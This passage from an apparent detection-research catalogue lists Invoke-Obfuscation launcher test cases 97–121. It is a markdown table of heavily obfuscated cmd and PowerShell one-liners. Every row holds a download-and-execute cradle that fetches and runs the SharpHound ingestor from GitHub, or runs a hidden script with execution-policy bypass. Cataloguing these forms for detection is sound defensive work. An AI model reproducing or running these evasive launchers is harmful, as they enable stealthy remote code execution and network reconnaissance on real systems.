'G','et-','IldiTEm','CH' ) (  \"{1}{0}{2}\" -f ':','env','uBSa' ) ).\"VA`lue\"   )&&c:\wINDows\SYsTeM32\Cmd  /C%hWacb%"
| 97 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\6 | cMd /C"SET  yWU=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&SeT   GeI=pOWerSHELL -wiNdOwSty hIDdeN     ${E`X`ECU`TiO`N`CoNtEXt}.\"Invo`Keco`mmand\".(\"{2}{1}{3}{0}\"-f'scrIpT','V','iN','OkE'  ).Invoke(   (  ^^^&  (\"{3}{0}{1}{2}\" -f'-','cHILD','ITEm','GET') (\"{0}{1}\"-f 'eNv:yw','u' )).\"V`AlUe\" )&& cMd /C%GEi%" | c:\WINDoWs\sysTEm32\CmD  /c "sET  PeC=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&SET  GafOn=pOWerSHEll -WINDOWsty  HiD      (  ^^^& (  \"{1}{0}{2}\" -f 'ILDI','Ch','TEm' ) (\"{2}{0}{1}\" -f':p','EC','EnV'  ) ).\"val`Ue\" ^^^|   ^^^&(  (   ^^^& (  \"{0}{2}{1}\" -f 'vari','Ble','a'  ) ( \"{1}{0}\" -f 'r*','*MD' ) ).\"Na`mE\"[3,11,2]-JOIn'')&&c:\WINDoWs\sysTEm32\CmD  /c%gAFoN%"
| 98 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\7 |  C:\winDOwS\sYsTeM32\cmD   /C  "SeT  FYwGB=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&SEt   tVSC=POWERShEll  -EXecuT bYPAsS   ${EXEcuTi`ON`cOn`TExt}.\"INVo`kECo`m`MANd\".( \"{3}{0}{1}{2}\" -f'Voke','sCRi','pt','in').Invoke(    (^^^&  (  \"{0}{1}\" -f'GC','I' ) (  \"{2}{1}{0}\" -f'WgB','Y','env:f' )  ).\"V`AlUE\")&& C:\winDOwS\sYsTeM32\cmD   /C%tvSC%" | c:\wiNDows\sYsteM32\Cmd   /c  "SeT  ZuT=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&seT   SRmOv=poweRshElL  -exeCuTIoN  BYPASs     ${QD`Mgk}=   [TypE](  \"{2}{0}{1}\" -f'nvIrONMEN','t','E' )    ;  ${e`XecUTi`o`NC`ontExT}.\"InVOKE`c`omM`ANd\".\"i`N`Vo`kESCrIpt\"( ( ${Q`Dm`GK}::(  \"{3}{4}{0}{6}{5}{1}{2}\"-f 'te','MENTVArIA','ble','G','e','irOn','nv').Invoke( 'zut',(  \"{2}{0}{1}\" -f'S','S','PrOCe') ))    )&& c:\wiNDows\sYsteM32\Cmd   /c%srmOV%"
| 99 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\8 |  CMD.ExE  /c"sET   vucT=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&Set   TLwY=c:\windoWS\sYswOW64\WindOwSPowerSHELL\v1.0\PowErshEll.eXe    SET-VARIAble ( \"6i3G\"  +  \"VD\" )  (    [TyPE](  \"{1}{2}{0}\" -F 'NT','eN','ViRonme'  )    ) ;  .  (   ${vERBoS`ep`RE`FeR`e`Nce}.( \"{1}{0}{2}\" -f'St','TO','RINg' ).Invoke(   )[1,3]  +'x'-JoIN''  ) (  ( (   item (  'VA'+  'RIABlE:6i'  + '3G' +'vD' )   ).\"VaL`Ue\"::( \"{3}{1}{0}{4}{2}\" -f 'nMenT','ETENVIro','ArIabLE','G','V'  ).Invoke( ( \"{0}{1}\"-f'VU','ct' ),(  \"{1}{0}\"-f 's','procEs' ) )  )   ) &&  CMD.ExE  /c %tLWY%" | cMD   /c   "sET  SvN=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&sEt  oepWu=C:\wiNDOWs\syswOW64\WiNDOWSpOweRsHell\V1.0\pOWersHeLL.ExE     ${execUTiOnconTEXt}.\"I`NVOkEc`OMMAND\".(\"{0}{3}{1}{2}\"-f'Inv','SC','ript','Oke').Invoke(( ^^^&(  'Ls' ) (  \"{0}{1}{2}\" -f 'enV:s','v','N') ).\"val`UE\"  )&&cMD   /c %oePWu%"

### STDIN++ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 100 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\0 | Cmd /c   "SeT   qhG= Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&SEt  aFWt=ECho  iex ([envIRoNment]::gEteNVIrOnMENTvaRIAble('Qhg','PROcEss'))^\|pOwErshEll    ${InPUt} ^^^\|. ( $shELLid[1]+$SHELLID[13]+'x')&&Cmd /c %AfwT%" | cMD/C   "SET   DLx= powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1  &&set   Tdhc=eCho  (Gi variAblE:exEcutIOnCOnTExT).vALuE.INvOkeCOmmANd.InvoKEScrIPt(  (GI eNv:DLx).Value ) ^\|  POWErSHELl    (gv 'eXECutIOncoNtEXT').VALUE.InVoKEcommAND.INvokESCRipT(${Input} ) &&cMD/C%tdHc%"
| 101 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\1 | C:\wINDOWS\sysTeM32\CmD.exE   /C "sET   mTn=  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  &&  sET   Ejp=Echo iex (Item eNV:MtN).ValuE ^\| poWErsHell -noexi   -  &&C:\wINDOWS\sysTeM32\CmD.exE   /C %EJp%" | CmD.eXe  /c  "sET  xMUv=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&Set  tCb=eCho  IEX  (get-ITem ENV:XmUV).valUE  ^\|  POwerShEll -NoeXI      - &&  CmD.eXe  /c%Tcb%"
| 102 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\2 | C:\winDoWS\SySTEm32\cmd  /C   "SeT  Qrxl=  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&Set  nsoq=echo (GET-itEm vaRIabLE:*eCU*t).vaLUE.iNvoKECOmMaNd.InvoKescRipT(  ([eNViROnMenT]::getENvIroNmeNtvaRiAbLe('QrXl','PROceSS')) )^\| pOWerSHELl  -nOni   $InpuT^^^\|. ((gv '*mdr*').namE[3,11,2]-JoIn'')&&  C:\winDoWS\SySTEm32\cmd  /C%NsOQ%" | c:\WInDoWs\sysTem32\CMd.eXE   /c  "set   gHP=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1  &&sET  zAI=EChO  IEX ([ENVIRoNMeNT]::GEtEnvirOnmEntVARIaBle('gHP','pRoCeSS'))  ^\|pOWErshEll -NoNiNTErA       ${inpUT} ^^^\|. ((gv '*MDr*').NamE[3,11,2]-JoIn'') &&c:\WInDoWs\sysTem32\CMd.eXE   /c %zai%"
| 103 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\3 | c:\WINdows\systeM32\cmd  /C   "SET   KbRxa=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  &&SeT  NZT=EChO  ${EXEcutioncoNtEXt}.invOKeCoMMaNd.invokEsCRIpt( ([enViroNment]::GeTeNVIROnmeNTvarIaBLe('KbRXA','PROceSs')) ) ^\|POWeRShELL  -noLo      ${InpuT} ^^^\|. ((VarIaBLe '*mDR*').nAmE[3,11,2]-join'')  &&c:\WINdows\systeM32\cmd  /C %nzt%" | C:\WiNDowS\SysteM32\cmD   /c   "SET   aql=  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1  && SeT   qIvx=eCHo  (LS vArIabLe:Ex*xT).VALuE.iNvOkecOmmaND.INVOkeSCRiPT(  ([EnVIrONMent]::GEteNviRoNMeNtVarIablE('aqL','proceSS')))  ^\| PowERSHELl  -nol      $ExecUtiOncONTExt.InVoKEcOMmAnD.INVOKESCRipT( ${iNPUT}  )  &&  C:\WiNDowS\SysteM32\cmD   /c%qivx%"
| 104 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\4 | c:\WINDOwS\SysTEm32\cMD  /C "sET  YRplB=  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound &&SeT   Euf=eCHO Iex ([eNVIrONMENt]::geTeNVIronMENTvaRIaBLE('YrPLB','pROCess'))  ^\|  POWERshell -NOpRO     ${ExeCuTiOncOnteXT}.invoKEcoMMAnd.iNvokEScripT(  $INput )  && c:\WINDOwS\SysTEm32\cMD  /C %EuF%" | c:\wIndOWS\SysteM32\CmD   /C   "sEt  JsN=  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 &&  seT  DRQf=ECHo ${eXECUTioNcONTExT}.InvOkecOmmand.InvOkESCrIpt( (Get-CHiLDitEm env:JsN).VALue)  ^\|  powErShEll  -NOpROF   ^^^&( $pSHOme[21]+$PShOme[34]+'X')(${inPuT})  && c:\wIndOWS\SysteM32\CmD   /C%DrQF%"
| 105 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\5 | Cmd.exE /C"sET  OBHr= Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  &&  Set  UgQNf=ecHO iNVoKe-eXpReSsiON (gEt-ChILDItEM enV:obhr).vaLue^\|poWErSHeLl  -co      ${inPut} ^^^\| InvoKE-eXprEssION  &&Cmd.exE /C%uGQNf%" | CMd  /C"set  ImYa= powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 && SeT   maeg=eCHO ${eXEcutIOnConText}.INvokEcommaND.INVOkescriPT(([eNViRonmENT]::geteNVIroNMenTvaRiAble('IMYA','prOCeSS')) )^\|pOWErShELl  -cO    $InPuT^^^\| INvoKe-expReSSION  && CMd  /C%mAeG%"
| 106 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\6 | cMd   /c"Set   PUW=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound &&  seT   Thl=ECho ${EXeCuTIOnCOnText}.invoKECOmmaND.InVOkesCrIpt(  ([ENvIRONment]::GeteNvIroNmeNtVARiABlE('pUw','PrOCesS')) )^\| powErshElL -WI hiDdE    $EXeCuTIOncontEXT.INVOkEcommand.INVoKEsCrIPt(  ${INPuT}  )&& cMd   /c%THL%" | CMD /C   "Set   TFZMy=  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 && SET   kHi=EChO iNVokE-EXPrESSioN  ([eNVIrOnmEnt]::geTEnvIrOnMENTvAriaBLE('tfzmy','proCesS'))^\| PoWERSHelL -W hiDdEN      .( $ENV:COMSPEC[4,15,25]-JoiN'') ( ${inPUT}) &&CMD /C%KhI%"
| 107 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\7 | CmD  /C  "SeT   KbZh=  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  && SeT  fvuJa=ECHo  ${EXECutIoncoNtExt}.iNVOkEcOMmANd.INVOKEsCrIpT( (ITEm ENV:KbZH).vAlue ) ^\| pOWerShElL  -ExeCuTIOnPOL bYPasS    $iNPut ^^^\| . ( $PsHOme[4]+$PShOmE[30]+'X')&& CmD  /C%FVuJA%" | c:\WiNDows\SYStem32\CMD  /c"SET  fGpLs= powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1  &&  set   HfT=ECho  InVoke-ExPReSSion (GET-childItEm ENv:FgpLS).vAlue  ^\|pOWeRshELl  -EXEcU ByPASs    ${INpUt} ^^^\|.( $veRbOSEpREfEREnce.TOSTRiNg()[1,3]+'x'-JoiN'') &&c:\WiNDows\SYStem32\CMD  /c%Hft%"
| 108 | LAUNCHER | LAUNCHER\STDIN++ | LAUNCHER\STDIN++\8 | cmd /c "SeT  dovY=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  &&SEt   hzy=ECho  (gET-cHildiTEm vARIABLe:E*TeX*).value.iNvOkeCOMMAND.InvokesCRIpt((Get-cHiLdIteM eNV:DOVy).vAlue)  ^\| C:\WINdoWs\SYSWOw64\wiNdoWSPoWerSHElL\v1.0\pOWERShELl.eXE     $EXecuTIonCONText.InvokecOmMAnD.InVoKEScRIpt(  $iNPuT) &&  cmd /c%hZY%" | c:\WIndows\sySteM32\cMd.EXE   /C"SeT  Mplxy=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1  &&sET  dKF=Echo  $eXeCutionCONtexT.inVoKecOmmAND.InvOkEScrIpT((ls ENV:MPLXy).value)^\| C:\WIndoWs\SYsWow64\WinDoWspoWerSHelL\V1.0\poWERSHElL.ExE     $ExEcuTioNCONteXT.InvOKEcoMMand.invOkESCRIpT( $inpuT) && c:\WIndows\sySteM32\cMd.EXE   /C %dKf%"

### CLIP++ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Result |
| :---: | :---: | :---: | :---: | :--- |
| 109 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\0 | c:\wINdOwS\sySTeM32\CMd   /c "EcHO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound| CLIp &&c:\wINdOwS\sySTeM32\CMd   /c   PoWERsHELl  -STA  . (\"{0}{2}{1}\"-f 'Add','ype','-T' ) -A (  \"{2}{3}{0}{4}{1}\"-f 'i','re',(  \"{1}{0}\" -f'sen','Pre'  ),'tat',(  \"{1}{0}\" -f'nCo','o'  ) ) ;     ^^^&   ( (  .( 'GV') ( \"{0}{1}\"-f'*mDR','*' ) ).\"NA`ME\"[3,11,2]-JOin''  )( ( [wINdOwS.ClIPBoArD]::(\"{0}{1}\"-f'Ge',(  \"{1}{0}\" -f'EXt','tT') ).\"InV`oke\"( )))    ;   [Windows.Clipboard]::( \"{0}{1}\" -f'Cle','ar'  ).\"INvo`Ke\"(    )"
| 110 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\1 | C:\wiNDOwS\SYSTEM32\Cmd   /c"  ecHO Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound|c:\wINdOwS\syStEm32\CLIP.ExE &&C:\wiNDOwS\SYSTEM32\Cmd   /c  POWERShelL -Noexit  -sT   ^^^&( \"{0}{1}{2}\"-f 'Ad','d-T','ype') -AN ( \"{5}{3}{0}{4}{1}{2}\" -f(  \"{1}{0}\"-f 's.F','ow' ),'m','s',( \"{0}{2}{1}\" -f 's','.Wind','tem'  ),'or','Sy') ;   ${ExecutioNCoNTExT}.\"InVoK`ec`O`m`mAnD\".\"iN`VokESc`RipT\"(  ([sYSTeM.wIndOWs.fORms.clipBOArD]::(  \"{1}{0}{2}\" -f 't','ge',( \"{1}{0}\" -f 't','Tex'  )  ).\"INVO`kE\"( ) )  )  ;  [System.Windows.Forms.Clipboard]::( \"{0}{1}{2}\"-f'S',( \"{1}{0}\"-f'Te','et'),'xt').\"INVO`Ke\"(' ' )"
| 111 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\2 | cmD.EXE /c  "EcHo\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound| c:\WIndows\SYSteM32\CLiP &&cmD.EXE /c POweRsHELl -nOniNTeRACTIV  -St  ${N`UlL} =  [Reflection.Assembly]::(\"{1}{0}{4}{5}{2}{3}\"-f 'oa','L','al',(  \"{0}{1}\" -f 'Na','me' ),(  \"{0}{1}{2}\" -f 'd','WithPar','t'),'i' ).\"inVo`kE\"((  \"{1}{2}{3}{0}\"-f'rms','System','.W','indows.Fo')) ;    ([SYStem.WindowS.fORMs.cLIpboARD]::(\"{1}{2}{0}\"-f 'T',(  \"{0}{1}\"-f'G','Ette'),'x').\"I`NVOKe\"(  )) ^^^|. ( ${E`NV:Co`ms`PEC}[4,26,25]-joiN''  )   ;[System.Windows.Forms.Clipboard]::(  \"{1}{0}\" -f(  \"{0}{1}\"-f'le','ar'  ),'C').\"iNV`OKe\"(  )"
| 112 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\3 | CmD.Exe /C"echo/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound |ClIP &&CmD.Exe /C   poWeRSHeLl  -sT -NoL    . ( \"{0}{1}{2}\" -f 'A','dd',( \"{1}{0}\" -f 'e','-Typ') ) -Assembly (  \"{2}{3}{0}{1}\"-f (  \"{1}{0}\" -f 't','nta'  ),(  \"{0}{1}\" -f'io','nCore'),( \"{0}{1}\" -f'P','res'),'e'  )  ;${EXeCuTioNCoNtExt}.\"i`NVokECO`M`M`AnD\".\"in`VoKEScr`I`PT\"(  (  [SyStem.WiNDows.clIPboaRd]::(  \"{2}{0}{1}\" -f 'E',(  \"{1}{0}\"-f 'eXt','tT'  ),'G' ).\"IN`VoKE\"()  )  )    ;   [System.Windows.Clipboard]::(  \"{1}{0}\"-f 'ear','Cl').\"i`NvOkE\"(   )"
| 113 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\4 | C:\winDoWS\SysTEM32\cmd.Exe   /C "echo\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | CLip.ExE &&C:\winDoWS\SysTEM32\cmd.Exe   /C poweRShElL -sT  -noP    .(\"{0}{1}\"-f 'A',(  \"{0}{1}\" -f'dd-Ty','pe' )) -A ( \"{0}{1}{2}{3}\"-f(  \"{0}{2}{1}\"-f 'P','ti','resenta' ),'o','nCo','re'  )  ;   ${ex`eC`UtiONCoN`TExt}.\"in`VO`kEc`o`MMaNd\".\"inv`oK`EScR`iPt\"(  (  [WIndoWs.cliPboArD]::(  \"{0}{1}{2}\"-f'g','Et',(  \"{1}{0}\" -f'T','TEx')  ).\"I`N`VOke\"( ) )   )  ;  [Windows.Clipboard]::(  \"{0}{1}\" -f( \"{1}{0}\" -f 'ea','Cl'),'r'  ).\"I`NVOkE\"(  )"
| 114 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\5 | C:\WINdOWS\syStEm32\cMD.exe   /c  " ECho Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | c:\wINdowS\sYsTem32\CLiP.exe&&C:\WINdOWS\syStEm32\cMD.exe   /c  pOWERSHell -St -CO   ^^^&( \"{0}{2}{1}\" -f (  \"{1}{0}\" -f '-T','Add' ),'pe','y') -AssemblyName (\"{3}{0}{1}{2}{4}{5}\" -f 'ys',(  \"{1}{0}\"-f 'em.W','t' ),(  \"{1}{0}\"-f'ws','indo'),'S',(  \"{1}{0}\" -f 'r','.Fo'  ),'ms'  )  ; ${ExeCUTIoNCONtEXT}.\"i`NvoKEcO`MMaNd\".\"INV`O`Ke`scrIPt\"( (  [syStEm.WIndoWs.ForMs.cLipboaRD]::( \"{1}{2}{0}\"-f't','ge',(\"{1}{0}\"-f 'tex','t')).\"IN`VOKE\"(   )) )   ; [System.Windows.Forms.Clipboard]::(\"{2}{0}{1}\"-f'Te','xt','Set'  ).\"I`Nvo`Ke\"( ' '  )"
| 115 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\6 | Cmd /C " ecHo Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound|cLIP.ExE &&Cmd /C  PoWeRSHElL -StA -w hiDdEn    .  (\"{0}{1}{2}\"-f 'Ad',(\"{0}{1}\" -f 'd-T','y'),'pe') -Asse (\"{0}{3}{2}{1}\"-f( \"{0}{1}\"-f'P','res' ),( \"{1}{0}\" -f'ore','C' ),'on',(\"{2}{1}{0}\"-f 'tati','n','e' )  )   ;  ( [WiNdOWS.clIPBoaRd]::(  \"{0}{1}\"-f( \"{0}{1}\"-f'Ge','TT' ),'exT'  ).\"in`VOke\"(  ) )^^^|  .( ( [striNG]${v`ErbO`SEPREFeRE`N`Ce}  )[1,3]+'x'-jOIn'')  ;  [Windows.Clipboard]::(  \"{0}{2}{1}\" -f 'S','t',(  \"{0}{1}\" -f 'e','tTex'  ) ).\"iN`VoKE\"(' ' )"
| 116 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\7 | c:\wInDows\SYSTEM32\cmd   /C  " echo/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound |clIP.EXe&&c:\wInDows\SYSTEM32\cmd   /CPOWErSHeLL  -eXEcU  bYPAsS  -sta   [Void][System.Reflection.Assembly]::(  \"{1}{2}{0}{3}\"-f 'Par','L',(  \"{1}{0}\"-f 'h','oadWit' ),(\"{2}{0}{1}\"-f'ialNam','e','t' )).\"in`V`oKE\"(  (\"{1}{4}{2}{0}{3}\" -f 'ows.Form','Sy','ind','s','stem.W' ))  ;   ^^^&   ( ${vE`RbOSe`p`ReFEReNCe}.(  \"{1}{0}\"-f ( \"{1}{0}\"-f'G','RIn'),(  \"{1}{0}\" -f'T','toS'  ) ).\"I`NvOke\"( )[1,3] + 'X'-jOIn''  ) ( (  [SyStEm.winDowS.ForMS.CLIpboArd]::( \"{0}{1}\"-f ( \"{0}{1}\"-f'GeT','T'  ),'ext' ).\"In`VoKe\"( ))  ) ;   [System.Windows.Forms.Clipboard]::(\"{1}{0}\"-f 'ar','Cle'  ).\"i`NvOKE\"(    )"
| 117 | LAUNCHER | LAUNCHER\CLIP++ | LAUNCHER\CLIP++\8 | cmd   /C " EcHO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | clIP.exe&&cmd   /C c:\WIndOws\sySwOW64\WiNdOWsPoweRsHeLL\v1.0\PowERSHeLl.Exe -StA   ^^^& (\"{2}{1}{0}\" -f 'e','Typ',(\"{0}{1}\" -f'Ad','d-' )) -Assem (  \"{3}{0}{2}{1}\"-f'in',(\"{0}{2}{1}\" -f 's.','rms','Fo'  ),'dow',(  \"{0}{2}{1}\"-f 'System','W','.') ) ;  ( [wInDOwS.fORms.CliPBOARD]::(  \"{1}{2}{0}\"-f 't','g',(  \"{0}{1}\" -f'etT','Ex'  ) ).\"iN`V`OKE\"( )  )   ^^^|.(   ${PsHo`me}[4]+${PSH`o`me}[30]+'X')  ;  [Windows.Forms.Clipboard]::(  \"{1}{0}\" -f (\"{1}{0}\" -f'r','lea'  ),'C').\"IN`VOKe\"(  )"

### RUNDLL++ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Result |
| :---: | :---: | :---: | :---: | :--- |
| 118 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\0 | CMd.EXe/c  "sEt  svP=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\WIndOWS\sYSTeM32\RUnDlL32 SHELL32.DLL   ,ShellExec_RunDLL "poWERShell"   " ${09CG}=   [tyPe](  '{2}{0}{1}'-F'viR','OnMeNT','en')   ;   ${eXEcUtIOncoNteXT}.'inVOkeCommANd'.'invokEsCRiPT'(  ( ${09cG}::('{4}{5}{0}{2}{6}{1}{3}' -f 'o','tV','nme','ArIAbLe','gEteNv','IR','n'  ).Invoke( 'SVp',(  '{1}{0}' -f'S','procES' ))  ) )"
| 119 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\1 | c:\WIndows\SysTEm32\cMd   /c"SeT  xlbaz=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&C:\wInDOWs\SYSTEm32\RuNDLL32 SHELL32.DLL,,,  ShellExec_RunDLL  "POwershELL"   "-NOExi  "     "   .  ('{1}{0}'-f'x','iE'  ) ( (  ^&  ('{1}{0}' -f 'R','Di') ('{0}{1}' -f'e','nv:xlbAz'  ) ).'valuE'   ) "
| 120 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\2 | C:\wInDows\SystEm32\CMD.ExE   /C   "sEt  wBmA=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&C:\WIndows\SYsTEm32\RuNdLL32  SHELL32.DLL,ShellExec_RunDLL "POWERsHelL"  "  -NONinter"     "(  .('{1}{0}' -f'R','DI'  ) ( '{2}{1}{0}' -f 'A',':wbM','Env'  )).'vALUE'  ^|    .(  ${SHELliD}[1]+  ${SHElLId}[13]+ 'X'  )"
| 121 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\3 | C:\wINdOWs\sysTEm32\CmD  /C "sET   zUO=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&RunDlL32   SHELL32.DLL ShellExec_RunDLL   "POwERShelL" " -NoloGO "  "   ^&  (   ${Env:coMsPec}[4,15,25]-JOIN'' ) (   ( .( 'lS' ) (  '{0}{1}' -f'enV:','zuO')).'VAlue'   )"
